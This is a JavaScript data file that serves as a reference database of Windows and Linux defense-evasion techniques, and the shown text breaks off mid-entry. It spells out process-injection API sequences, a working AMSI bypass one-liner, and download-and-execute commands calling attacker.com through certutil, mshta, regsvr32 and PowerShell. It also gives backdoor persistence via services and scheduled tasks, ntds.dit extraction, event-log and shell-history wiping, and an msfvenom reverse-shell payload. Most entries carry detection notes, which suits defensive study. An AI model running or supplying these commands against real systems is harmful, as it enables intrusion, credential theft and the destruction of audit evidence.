// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Defense Evasion & Anti-Forensics Reference Database
// AV/EDR bypass techniques, LOLBins, process injection, and evasion methods.

export const PROCESS_INJECTION_TECHNIQUES = [
  {
    id: "INJECT-001",
    name: "Classic DLL Injection",
    mitre: "T1055.001",
    description: "Inject a malicious DLL into a remote process by allocating memory, writing the DLL path, and creating a remote thread to call LoadLibrary.",
    steps: [
      "OpenProcess() — get handle to target process",
      "VirtualAllocEx() — allocate memory in target for DLL path string",
      "WriteProcessMemory() — write DLL path to allocated memory",
      "GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA') — get LoadLibrary address",
      "CreateRemoteThread() — create thread in target that calls LoadLibrary with the DLL path"
    ],
    detection: "Monitor for CreateRemoteThread API calls, VirtualAllocEx with PAGE_EXECUTE_READWRITE, unusual DLL loads in process. ETW: Microsoft-Windows-Kernel-Process provider.",
    difficulty: "easy",
    edrDetection: "high — most modern EDRs detect this pattern"
  },
  {
    id: "INJECT-002",
    name: "Process Hollowing (RunPE)",
    mitre: "T1055.012",
    description: "Create a legitimate process in suspended state, unmap its image, replace it with malicious code, and resume execution.",
    steps: [
      "CreateProcess() with CREATE_SUSPENDED flag — create suspended legitimate process (e.g., svchost.exe)",
      "NtUnmapViewOfSection() — unmap the legitimate executable image",
      "VirtualAllocEx() — allocate memory at the original image base",
      "WriteProcessMemory() — write malicious PE into allocated memory",
      "SetThreadContext() — update thread context to point to new entry point",
      "ResumeThread() — resume execution of the hollowed process"
    ],
    detection: "Compare in-memory image to on-disk image (they won't match). Monitor for NtUnmapViewOfSection followed by VirtualAllocEx. Sysmon Event ID 25 (Process Tampering).",
    difficulty: "medium",
    edrDetection: "high — well-known technique, most EDRs detect the unmapping pattern"
  },
  {
    id: "INJECT-003",
    name: "Thread Execution Hijacking",
    mitre: "T1055.003",
    description: "Suspend an existing thread in a target process, modify its instruction pointer to execute malicious code, then resume it.",
    steps: [
      "OpenThread() — get handle to target thread",
      "SuspendThread() — pause the thread",
      "VirtualAllocEx() — allocate memory in target process",
      "WriteProcessMemory() — write shellcode to allocated memory",
      "GetThreadContext() — get current thread context (registers)",
      "Modify RIP/EIP to point to shellcode",
      "SetThreadContext() — update thread registers",
      "ResumeThread() — resume with shellcode execution"
    ],
    detection: "Monitor for SuspendThread + SetThreadContext combination. Check for threads with unusual instruction pointers. Sysmon Event ID 8 (CreateRemoteThread).",
    difficulty: "medium"
  },
  {
    id: "INJECT-004",
    name: "APC Injection (QueueUserAPC)",
    mitre: "T1055.004",
    description: "Queue an Asynchronous Procedure Call (APC) to a thread in a target process. The APC executes when the thread enters an alertable wait state.",
    steps: [
      "OpenProcess() — get handle to target process",
      "VirtualAllocEx() + WriteProcessMemory() — write shellcode to target",
      "OpenThread() — get handle to a target thread",
      "QueueUserAPC(shellcode_addr, thread_handle, 0) — queue APC to thread",
      "Wait for thread to enter alertable state (SleepEx, WaitForSingleObjectEx, etc.)"
    ],
    variant: "Early Bird APC: Create process suspended, queue APC before the process initializes, then resume. APC executes before most EDR hooks are placed.",
    detection: "Monitor QueueUserAPC API calls targeting remote processes. Check for suspicious memory allocations in target process.",
    difficulty: "medium"
  },
  {
    id: "INJECT-005",
    name: "AtomBombing",
    description: "Abuse Windows Global Atom Table to inject code into a target process without using VirtualAllocEx or WriteProcessMemory.",
    mechanism: "Write malicious code to the Global Atom Table (accessible by all processes), then use APC to invoke GlobalGetAtomName in the target process to read the atom into RWX memory. Finally, modify a legitimate function pointer to redirect execution.",
    advantage: "Avoids VirtualAllocEx + WriteProcessMemory pattern that many EDRs monitor.",
    detection: "Monitor for unusual GlobalAddAtom/GlobalGetAtomName usage patterns. Check for RWX memory regions in processes.",
    difficulty: "hard"
  },
  {
    id: "INJECT-006",
    name: "Process Doppelgänging",
    description: "Abuse Windows NTFS Transactions to create a fileless process from a transacted file that is never committed to disk.",
    steps: [
      "Create NTFS transaction: NtCreateTransaction()",
      "Create transacted file: CreateFileTransacted() with malicious PE content",
      "Create section from transacted file: NtCreateSection()",
      "Rollback transaction: NtRollbackTransaction() — file is never written to disk",
      "Create process from section: NtCreateProcessEx()",
      "Create thread: NtCreateThreadEx()"
    ],
    advantage: "No file written to disk. Bypasses most file-based AV scanning.",
    detection: "Monitor for NtCreateTransaction + NtCreateSection + NtRollbackTransaction sequence. ETW Kernel-Transaction events.",
    difficulty: "hard"
  },
  {
    id: "INJECT-007",
    name: "Phantom DLL Hollowing",
    description: "Map a legitimate DLL, replace its code section with malicious code, then create a remote thread to execute it. The process appears to have loaded a legitimate DLL.",
    steps: [
      "Map a legitimate DLL into the target process using NtMapViewOfSection()",
      "Modify the mapped DLL's code section with malicious payload",
      "Create remote thread starting at the DLL's entry point"
    ],
    advantage: "Memory appears to be backed by a legitimate DLL on disk. Hard to detect via memory scanning.",
    difficulty: "hard"
  },
  {
    id: "INJECT-008",
    name: "Module Stomping / DLL Hollowing",
    mitre: "T1055.001",
    description: "Load a legitimate DLL into a target process, then overwrite its .text section with shellcode. The malicious code runs from within a legitimately loaded module.",
    advantage: "Shellcode resides in memory backed by a signed DLL. Memory scanners that compare disk vs memory may miss if only .text is modified.",
    detection: "Compare .text section hash of loaded DLLs against their on-disk counterparts.",
    difficulty: "medium"
  },
  {
    id: "INJECT-009",
    name: "Callback-based Injection",
    description: "Instead of CreateRemoteThread, use Windows API functions that accept callback parameters to execute shellcode.",
    callbacks: [
      { api: "EnumWindows()", description: "Enumerate windows with a callback function — shellcode as the callback" },
      { api: "EnumChildWindows()", description: "Enumerate child windows with callback" },
      { api: "EnumFonts()", description: "Enumerate fonts with callback" },
      { api: "CreateTimerQueueTimer()", description: "Create a timer that executes shellcode on expiration" },
      { api: "SetTimer()", description: "Window timer with callback" },
      { api: "CertEnumSystemStore()", description: "Enumerate certificate stores with callback" },
      { api: "CertEnumSystemStoreLocation()", description: "Another certificate enumeration callback" },
      { api: "EnumResourceTypesEx()", description: "Enumerate resource types with callback" },
      { api: "EnumDateFormats()", description: "Date format enumeration callback" },
      { api: "EnumDesktops()", description: "Desktop enumeration callback" }
    ],
    advantage: "Avoids CreateRemoteThread which is heavily monitored by EDRs.",
    difficulty: "medium"
  },
  {
    id: "INJECT-010",
    name: "Syscall-based Injection (Direct Syscalls)",
    description: "Make direct NT syscalls instead of using Win32 API to bypass user-mode hooks placed by EDRs on ntdll.dll.",
    mechanism: "EDRs typically hook ntdll.dll functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) to monitor process behavior. By making direct syscalls (using the syscall instruction with the correct syscall number), these hooks are completely bypassed.",
    tools: [
      { name: "SysWhispers", description: "Generate syscall stubs for direct NT API calls — avoids ntdll.dll hooks entirely" },
      { name: "SysWhispers2", description: "Improved version with egg-hunting and random syscall ordering" },
      { name: "SysWhispers3", description: "Latest version supporting multiple call methods: direct, indirect, random" },
      { name: "HellsGate", description: "Dynamically resolve syscall numbers at runtime from ntdll.dll" },
      { name: "HalosGate", description: "HellsGate variant that handles hooked ntdll by searching nearby syscalls" },
      { name: "TartarusGate", description: "Advanced Gate technique handling multiple hook types" }
    ],
    detection: "Detect syscall instructions outside of ntdll.dll memory range. ETW kernel-level monitoring. Kernel callbacks (PsSetCreateProcessNotifyRoutine).",
    difficulty: "hard"
  }
];

export const AMSI_BYPASS_TECHNIQUES = [
  {
    id: "AMSI-001",
    name: "AMSI Patch (AmsiScanBuffer)",
    description: "Patch the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN, preventing PowerShell from detecting malicious scripts.",
    mechanism: "Find AmsiScanBuffer in amsi.dll, write bytes that cause the function to return 0 (clean) immediately. Common patch: replace first bytes with mov eax, 0x80070057; ret (return E_INVALIDARG).",
    detection: "Monitor for writes to amsi.dll memory. Detect patched AmsiScanBuffer via integrity checks. ETW: Microsoft-Antimalware-Scan-Interface provider.",
    variants: [
      "Overwrite AmsiScanBuffer return value",
      "Overwrite AmsiOpenSession to fail initialization",
      "Patch amsiInitFailed flag to bypass initialization",
      "Overwrite AMSI context to corrupt scan requests"
    ],
    difficulty: "easy"
  },
  {
    id: "AMSI-002",
    name: "AMSI String Obfuscation",
    description: "Avoid AMSI string-based detection by encoding, encrypting, or dynamically constructing malicious strings at runtime.",
    techniques: [
      "Base64 encoding: [System.Convert]::FromBase64String('base64payload')",
      "String concatenation: $a='Ams'; $b='iUt'; $c='ils'; iex \"$a$b$c\"",
      "Character array: [char[]]@(73,69,88) -join '' → 'IEX'",
      "XOR encryption: decode payload byte-by-byte with XOR key at runtime",
      "Variable substitution: ${A`m`s`i} or $env:C`O`M`S`P`E`C",
      "Hex encoding: [System.Text.Encoding]::Unicode.GetString([byte[]]@(0x49,0x00,0x45,0x00,0x58,0x00))"
    ],
    difficulty: "easy"
  },
  {
    id: "AMSI-003",
    name: "AMSI Provider Unhooking",
    description: "Unregister or disable AMSI providers (like Windows Defender) from the AMSI registry entries.",
    mechanism: "AMSI providers are registered under HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers. Removing or modifying these entries prevents AMSI from forwarding scans to the security product.",
    detection: "Monitor registry changes under AMSI\\Providers key. Integrity verification of AMSI provider registrations.",
    difficulty: "medium"
  },
  {
    id: "AMSI-004",
    name: "Reflection-based AMSI Bypass",
    description: "Use .NET reflection to access and modify internal AMSI fields without direct memory patching.",
    mechanism: "Access the AmsiUtils class via reflection, set the amsiInitFailed field to true. This causes AMSI to think initialization failed and skip all scans.",
    example: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    detection: "Monitor for reflection access to AmsiUtils class. ScriptBlock logging captures the reflection code.",
    difficulty: "easy"
  }
];

export const ETW_EVASION = [
  {
    id: "ETW-001",
    name: "ETW Patching (NtTraceEvent)",
    description: "Patch NtTraceEvent or EtwEventWrite in ntdll.dll to prevent Event Tracing for Windows from recording security-relevant events.",
    mechanism: "ETW is used by EDRs and security tools to monitor process behavior. By patching EtwEventWrite to return immediately (ret), no ETW events are generated by the process.",
    detection: "Verify EtwEventWrite integrity in ntdll.dll. Kernel-level ETW monitoring. Detect processes with suspiciously low ETW event counts.",
    difficulty: "medium"
  },
  {
    id: "ETW-002",
    name: "ETW Provider Blind",
    description: "Disable specific ETW providers by modifying the provider registration or session to stop receiving events.",
    techniques: [
      "Patch ETW provider registration structure to disable the provider",
      "Modify ETW session to exclude specific providers",
      "Unregister ETW consumer sessions that security tools rely on"
    ],
    difficulty: "hard"
  }
];

export const LOLBINS = [
  { name: "certutil.exe", description: "Certificate utility — can download files, encode/decode base64, and compute hashes", mitre: "T1140, T1105", capabilities: ["download", "encode", "decode", "hash"], examples: [
    { use: "Download file", command: "certutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe" },
    { use: "Base64 encode", command: "certutil -encode payload.exe payload.b64" },
    { use: "Base64 decode", command: "certutil -decode payload.b64 payload.exe" },
    { use: "Hash file", command: "certutil -hashfile file.exe SHA256" }
  ]},
  { name: "mshta.exe", description: "Microsoft HTML Application Host — execute HTA files or inline VBScript/JScript", mitre: "T1218.005", capabilities: ["execute", "download"], examples: [
    { use: "Execute HTA", command: "mshta http://attacker.com/payload.hta" },
    { use: "Inline VBScript", command: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\", 0:close\")" }
  ]},
  { name: "rundll32.exe", description: "Execute DLL functions — commonly used to run malicious DLLs", mitre: "T1218.011", capabilities: ["execute", "proxy"], examples: [
    { use: "Execute DLL export", command: "rundll32.exe malicious.dll,EntryPoint" },
    { use: "JavaScript execution", command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")" },
    { use: "Execute remote DLL", command: "rundll32.exe \\\\attacker\\share\\payload.dll,0" }
  ]},
  { name: "regsvr32.exe", description: "Register/unregister COM objects — can execute SCT (scriptlet) files from remote URLs", mitre: "T1218.010", capabilities: ["execute", "proxy", "download"], examples: [
    { use: "Execute remote scriptlet (Squiblydoo)", command: "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll" }
  ]},
  { name: "msiexec.exe", description: "Windows Installer — install MSI packages from local or remote sources", mitre: "T1218.007", capabilities: ["execute", "download", "install"], examples: [
    { use: "Execute remote MSI", command: "msiexec /q /i http://attacker.com/payload.msi" },
    { use: "Execute DLL via MSI", command: "msiexec /y C:\\temp\\payload.dll" }
  ]},
  { name: "cmstp.exe", description: "Connection Manager Profile Installer — execute INF files with arbitrary commands", mitre: "T1218.003", capabilities: ["execute", "bypass UAC"], examples: [
    { use: "UAC bypass via INF", command: "cmstp.exe /ni /s payload.inf" }
  ]},
  { name: "wmic.exe", description: "WMI command-line interface — execute processes, query system info, lateral movement", mitre: "T1047", capabilities: ["execute", "recon", "lateral"], examples: [
    { use: "Remote process execution", command: "wmic /node:TARGET process call create \"payload.exe\"" },
    { use: "XSL script execution", command: "wmic os get /FORMAT:\"http://attacker.com/payload.xsl\"" }
  ]},
  { name: "bitsadmin.exe", description: "Background Intelligent Transfer Service — download files in the background", mitre: "T1197", capabilities: ["download", "execute", "persist"], examples: [
    { use: "Download file", command: "bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\\temp\\payload.exe" },
    { use: "Persistence via notification", command: "bitsadmin /create backdoor; bitsadmin /addfile backdoor http://attacker.com/payload.exe C:\\temp\\payload.exe; bitsadmin /SetNotifyCmdLine backdoor C:\\temp\\payload.exe NULL; bitsadmin /resume backdoor" }
  ]},
  { name: "powershell.exe", description: "PowerShell — the most versatile LOLBin for scripting, downloading, and executing", mitre: "T1059.001", capabilities: ["execute", "download", "encode", "recon"], examples: [
    { use: "Download and execute", command: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"" },
    { use: "Encoded command", command: "powershell -ep bypass -enc BASE64_ENCODED_COMMAND" },
    { use: "AMSI bypass + execute", command: "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(payload)\"" }
  ]},
  { name: "csc.exe", description: "C# compiler — compile and execute C# code on the fly", mitre: "T1127.001", capabilities: ["compile", "execute"], examples: [
    { use: "Compile C# payload", command: "csc.exe /out:payload.exe /target:exe payload.cs" },
    { use: "Compile DLL", command: "csc.exe /out:payload.dll /target:library payload.cs" }
  ]},
  { name: "installutil.exe", description: ".NET Installation Utility — execute code via Installer class methods", mitre: "T1218.004", capabilities: ["execute", "bypass"], examples: [
    { use: "Execute .NET assembly", command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe" }
  ]},
  { name: "msbuild.exe", description: "Microsoft Build Engine — compile and execute inline C# tasks from XML project files", mitre: "T1127.001", capabilities: ["compile", "execute"], examples: [
    { use: "Execute inline task", command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml" }
  ]},
  { name: "forfiles.exe", description: "Select and execute commands on files — can be used to execute arbitrary commands", mitre: "T1202", capabilities: ["execute", "proxy"], examples: [
    { use: "Execute command", command: "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c calc.exe\"" }
  ]},
  { name: "pcalua.exe", description: "Program Compatibility Assistant — execute programs via compatibility layer", mitre: "T1202", capabilities: ["execute", "proxy"], examples: [
    { use: "Execute binary", command: "pcalua.exe -a payload.exe" },
    { use: "Execute URL", command: "pcalua.exe -a http://attacker.com/payload.exe" }
  ]},
  { name: "explorer.exe", description: "Windows Explorer — can be used to execute files", mitre: "T1202", capabilities: ["execute"], examples: [
    { use: "Execute file", command: "explorer.exe payload.exe" },
    { use: "Open URL", command: "explorer.exe http://attacker.com/" }
  ]},
  { name: "eventvwr.exe", description: "Event Viewer — UAC bypass via registry key manipulation", mitre: "T1548.002", capabilities: ["bypass UAC"], examples: [
    { use: "UAC bypass", command: "Set HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to payload path, then run eventvwr.exe" }
  ]},
  { name: "fodhelper.exe", description: "Features On Demand Helper — UAC bypass for Windows 10", mitre: "T1548.002", capabilities: ["bypass UAC"], examples: [
    { use: "UAC bypass", command: "Set HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command to payload, run fodhelper.exe" }
  ]},
  { name: "sc.exe", description: "Service Control Manager — create, start, stop, query Windows services", mitre: "T1543.003", capabilities: ["persist", "execute", "lateral"], examples: [
    { use: "Create service", command: "sc create backdoor binPath= \"C:\\temp\\payload.exe\" start= auto" },
    { use: "Remote service creation", command: "sc \\\\TARGET create backdoor binPath= \"C:\\temp\\payload.exe\"" }
  ]},
  { name: "schtasks.exe", description: "Task Scheduler — create scheduled tasks for persistence and execution", mitre: "T1053.005", capabilities: ["persist", "execute", "lateral"], examples: [
    { use: "Create scheduled task", command: "schtasks /create /tn backdoor /tr C:\\temp\\payload.exe /sc onlogon /ru SYSTEM" },
    { use: "Remote task creation", command: "schtasks /create /s TARGET /tn backdoor /tr payload.exe /sc onstart /ru SYSTEM" }
  ]},
  { name: "wscript.exe / cscript.exe", description: "Windows Script Host — execute VBScript and JScript", mitre: "T1059.005, T1059.007", capabilities: ["execute", "download"], examples: [
    { use: "Execute VBScript", command: "wscript.exe payload.vbs" },
    { use: "Execute JScript", command: "cscript.exe //E:jscript payload.js" }
  ]},
  { name: "cmd.exe", description: "Command Prompt — command execution and scripting", mitre: "T1059.003", capabilities: ["execute", "script"], examples: [
    { use: "Execute command", command: "cmd.exe /c payload.exe" },
    { use: "Download via copy", command: "cmd.exe /c copy \\\\attacker\\share\\payload.exe C:\\temp\\" }
  ]},
  { name: "control.exe", description: "Control Panel — execute CPL files (DLLs with .cpl extension)", mitre: "T1218.002", capabilities: ["execute"], examples: [
    { use: "Execute CPL", command: "control.exe payload.cpl" }
  ]},
  { name: "hh.exe", description: "HTML Help — execute CHM files that can contain scripts", mitre: "T1218.001", capabilities: ["execute"], examples: [
    { use: "Execute CHM", command: "hh.exe http://attacker.com/payload.chm" }
  ]},
  { name: "xwizard.exe", description: "Extensible Wizard Host — can load COM objects", mitre: "T1218", capabilities: ["execute"], examples: [
    { use: "Load COM object", command: "xwizard RunWizard {CLSID}" }
  ]},
  { name: "esentutl.exe", description: "Extensible Storage Engine Utilities — file copy that bypasses certain security controls", mitre: "T1003.003", capabilities: ["copy", "extract"], examples: [
    { use: "Copy locked file (like ntds.dit)", command: "esentutl.exe /y C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\ntds.dit /o" },
    { use: "Extract from shadow copy", command: "esentutl.exe /y \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit /d ntds.dit /o" }
  ]},
  { name: "nltest.exe", description: "Network Diagnostics — enumerate domain trusts and domain controllers", mitre: "T1482", capabilities: ["recon"], examples: [
    { use: "Enumerate domain trusts", command: "nltest /domain_trusts /all_trusts" },
    { use: "Get domain controllers", command: "nltest /dclist:DOMAIN" }
  ]},
  { name: "dnscmd.exe", description: "DNS Server Management — can register DLL as serverlevelplugindll for persistence", mitre: "T1543.003", capabilities: ["persist"], examples: [
    { use: "DNS server DLL persistence", command: "dnscmd.exe /config /serverlevelplugindll C:\\temp\\payload.dll" }
  ]}
];

export const FILELESS_ATTACK_TECHNIQUES = [
  {
    id: "FILELESS-001",
    name: "PowerShell Cradle (Download & Execute in Memory)",
    description: "Download and execute a script entirely in memory without touching disk.",
    examples: [
      "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
      "IEX (Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -UseBasicParsing).Content",
      "$wc=New-Object Net.WebClient;$wc.Proxy=[Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $wc.DownloadString('http://attacker.com/payload.ps1')"
    ],
    detection: "PowerShell ScriptBlock Logging (Event ID 4104), Module Logging, Transcription Logging. AMSI detection.",
    defense: "Constrained Language Mode, AMSI, ScriptBlock logging, AppLocker/WDAC to restrict PowerShell."
  },
  {
    id: "FILELESS-002",
    name: "WMI Event Subscription Persistence",
    description: "Use WMI event subscriptions to persist and execute code without files — commands stored in WMI repository.",
    mechanism: "Create a WMI EventFilter (trigger condition), EventConsumer (action), and FilterToConsumerBinding (link them). The command/script is stored in the WMI repository, not on the filesystem.",
    example: "$Filter = Set-WmiInstance -Namespace 'root/subscription' -Class __EventFilter -Arguments @{Name='Backdoor';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}",
    detection: "Monitor WMI repository for new event subscriptions. Sysmon Event ID 19/20/21 (WMI events). Check WMI repository: Get-WmiObject -Namespace root/subscription -Class __EventFilter",
    difficulty: "medium"
  },
  {
    id: "FILELESS-003",
    name: "Registry-based Persistence",
    description: "Store encoded payloads in registry values and execute them via LOLBins or scheduled tasks.",
    registryLocations: [
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "HKCU\\Environment\\UserInitMprLogonScript",
      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<exe>\\Debugger",
      "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute",
      "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command (for UAC bypass)",
      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\<exe>"
    ],
    detection: "Monitor registry modifications to autorun locations. Sysmon Event IDs 12/13/14 (Registry events). Autoruns tool for comprehensive autorun enumeration.",
    difficulty: "easy"
  },
  {
    id: "FILELESS-004",
    name: ".NET In-Memory Assembly Loading",
    description: "Load and execute .NET assemblies directly in memory using reflection, without writing to disk.",
    mechanism: "Use System.Reflection.Assembly.Load(byte[]) to load a compiled .NET assembly from a byte array in memory. The assembly can be downloaded, decoded from base64, or decrypted at runtime.",
    example: "$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.dll'); [System.Reflection.Assembly]::Load($bytes).GetType('Namespace.Class').GetMethod('Method').Invoke($null, $null)",
    detection: "AMSI detects many .NET assembly loads. ETW: Microsoft-Windows-DotNETRuntime provider. Monitor for Assembly.Load with byte arrays.",
    difficulty: "medium"
  }
];

export const LOG_TAMPERING_TECHNIQUES = [
  {
    id: "LOG-001",
    name: "Windows Event Log Clearing",
    commands: [
      { command: "wevtutil cl Security", description: "Clear Security event log" },
      { command: "wevtutil cl System", description: "Clear System event log" },
      { command: "wevtutil cl Application", description: "Clear Application event log" },
      { command: "Clear-EventLog -LogName Security,System,Application", description: "PowerShell — clear multiple logs" },
      { command: "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"", description: "Clear ALL event logs" }
    ],
    detection: "Event ID 1102 (Security log cleared) is generated when the Security log is cleared. Forward logs to SIEM before they can be tampered with.",
    defense: "Forward logs to centralized SIEM in real-time. Set maximum log size and retention. Restrict log clearing to specific admin accounts."
  },
  {
    id: "LOG-002",
    name: "Selective Event Log Deletion (Phantom)",
    description: "Delete individual event log entries instead of clearing the entire log — much stealthier than clearing.",
    tools: [
      { name: "Danderspritz (NSA)", description: "NSA's tool (leaked by Shadow Brokers) that can selectively delete individual Windows events" },
      { name: "Phant0m", description: "Kills event logging threads in svchost.exe without killing the service — events stop being recorded" },
      { name: "Invoke-Phant0m", description: "PowerShell implementation of thread killing technique" }
    ],
    mechanism: "Identify and suspend/kill threads responsible for the Windows Event Log service within svchost.exe. The service appears running but no events are recorded.",
    detection: "Monitor for thread termination in Event Log service process. Compare expected event volume vs actual. Gaps in log timestamps indicate tampering.",
    difficulty: "hard"
  },
  {
    id: "LOG-003",
    name: "Timestamp Manipulation (Timestomping)",
    mitre: "T1070.006",
    description: "Modify file creation, modification, and access timestamps to blend malicious files with legitimate system files.",
    tools: [
      { name: "timestomp (Metasploit)", command: "timestomp payload.exe -m '01/01/2020 12:00:00'", description: "Modify MACE timestamps" },
      { name: "PowerShell", command: "(Get-Item payload.exe).CreationTime = '01/01/2020 12:00:00'", description: "Native PowerShell timestamp modification" },
      { name: "touch (Linux)", command: "touch -t 202001011200 payload.sh", description: "Set modification time" },
      { name: "NirSoft BulkFileChanger", command: "GUI tool for mass timestamp modification", description: "Modify timestamps of many files at once" }
    ],
    detection: "Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps in MFT (they're modified separately). $SI is easily changed; $FN is harder. NTFS journal ($UsnJrnl) records original timestamps.",
    difficulty: "easy"
  },
  {
    id: "LOG-004",
    name: "Linux Log Tampering",
    commands: [
      { command: "echo '' > /var/log/auth.log", description: "Clear authentication log" },
      { command: "sed -i '/attacker_ip/d' /var/log/auth.log", description: "Remove lines containing attacker IP" },
      { command: "shred -fuz /var/log/auth.log", description: "Securely delete log file" },
      { command: "history -c; export HISTSIZE=0; unset HISTFILE", description: "Clear bash history and prevent logging" },
      { command: "ln -sf /dev/null ~/.bash_history", description: "Redirect history to /dev/null permanently" },
      { command: "utmpdump /var/log/wtmp | grep -v 'attacker' | utmpdump -r > /tmp/wtmp.clean; mv /tmp/wtmp.clean /var/log/wtmp", description: "Remove specific entries from wtmp (login records)" }
    ],
    detection: "Forward logs to remote syslog server. File integrity monitoring (AIDE, OSSEC). Monitor for unusual log file size decreases.",
    difficulty: "easy"
  }
];

export const AV_EDR_BYPASS_STRATEGIES = [
  {
    id: "BYPASS-001",
    name: "Payload Encryption / Packing",
    description: "Encrypt the payload and decrypt it only at runtime in memory. AV cannot scan encrypted blobs.",
    techniques: [
      "AES-256 encryption with runtime decryption",
      "XOR encoding with multi-byte key",
      "RC4 encryption (simple, fast, sufficient)",
      "Custom encoding schemes (rotate, substitute, polyalphabetic)",
      "Compression + encryption (UPX + XOR)"
    ],
    tools: [
      { name: "msfvenom encoders", command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=y -e x64/xor_dynamic -f exe", description: "Metasploit payload encoding" },
      { name: "Veil-Evasion", description: "Payload generation framework with multiple encryption/encoding options" },
      { name: "Scarecrow", description: "Payload creation framework for side-loading into legitimate Windows processes" },
      { name: "Nimcrypt2", description: "PE packer written in Nim — encrypts payload and decrypts at runtime" }
    ],
    effectiveness: "Medium — static analysis bypass, but behavioral detection still triggers on execution"
  },
  {
    id: "BYPASS-002",
    name: "Signed Binary Proxy Execution",
    mitre: "T1218",
    description: "Use legitimate, signed Microsoft binaries (LOLBins) to execute malicious code, bypassing application whitelisting and signature-based detection.",
    advantage: "The executing binary is signed by Microsoft, so application whitelisting (AppLocker, WDAC) and signature checks allow it.",
    defense: "WDAC with block rules for dangerous LOLBins. Monitor for unusual LOLBin usage patterns. Sysmon process creation logging."
  },
  {
    id: "BYPASS-003",
    name: "Unhooking (DLL Unhooking)",
    description: "Restore hooked ntdll.dll functions to their original state by reading a fresh copy from disk and overwriting the in-memory hooked version.",
    mechanism: "EDRs hook ntdll.dll functions by replacing the first bytes with a JMP to their monitoring code. To bypass: read ntdll.dll from disk (or from another process), map it, and overwrite the hooked .text section with the clean version.",
    techniques: [
      "Full DLL unhooking — replace entire ntdll.dll .text section from disk copy",
      "Selective unhooking — only restore specific functions you need",
      "Read ntdll from suspended process (before EDR hooks are applied)",
      "Read ntdll from KnownDlls (\\KnownDlls\\ntdll.dll)",
      "Perun's Fart — unhook by reading ntdll from a suspended process clone"
    ],
    detection: "Integrity monitoring of ntdll.dll in process memory. Detect reading of ntdll.dll from disk via NtCreateFile. Monitor for NtMapViewOfSection of ntdll.dll.",
    difficulty: "medium"
  },
  {
    id: "BYPASS-004",
    name: "Sleep Obfuscation",
    description: "Encrypt the payload in memory during sleep periods, so memory scanners cannot find the decrypted payload.",
    techniques: [
      { name: "Ekko", description: "Encrypt beacon in memory using ROP chain with SystemFunction032 (RC4) during sleep, decrypt before execution" },
      { name: "Deathsleep", description: "Similar to Ekko but uses different encryption approach" },
      { name: "Foliage", description: "APC-based sleep obfuscation technique" },
      { name: "Gargoyle", description: "Mark payload memory as non-executable during sleep, remark executable before use" }
    ],
    advantage: "Defeats periodic memory scanning by EDRs — payload is encrypted most of the time.",
    difficulty: "hard"
  },
  {
    id: "BYPASS-005",
    name: "Bring Your Own Vulnerable Driver (BYOVD)",
    mitre: "T1068",
    description: "Load a legitimate but vulnerable signed kernel driver to gain kernel-level access and disable security products.",
    examples: [
      { driver: "RTCore64.sys (Micro-Star)", cve: "CVE-2019-16098", description: "Arbitrary memory read/write — used to kill EDR processes from kernel" },
      { driver: "dbutil_2_3.sys (Dell)", cve: "CVE-2021-21551", description: "Arbitrary kernel memory read/write" },
      { driver: "ene.sys (ENE Technology)", cve: "Multiple", description: "Physical memory read/write" },
      { driver: "Process Explorer driver", cve: "N/A", description: "Legitimate Sysinternals driver — used to kill protected processes" }
    ],
    tools: [
      { name: "KDU (Kernel Driver Utility)", description: "Framework for loading vulnerable drivers and exploiting them" },
      { name: "EDRSilencer", description: "Uses Windows Filtering Platform to block EDR network communications" },
      { name: "Backstab", description: "Kill protected processes using Process Explorer's driver" }
    ],
    defense: [
      "HVCI (Hypervisor-Protected Code Integrity) — blocks unsigned/vulnerable drivers",
      "Microsoft Vulnerable Driver Blocklist",
      "EDR self-protection and tamper protection",
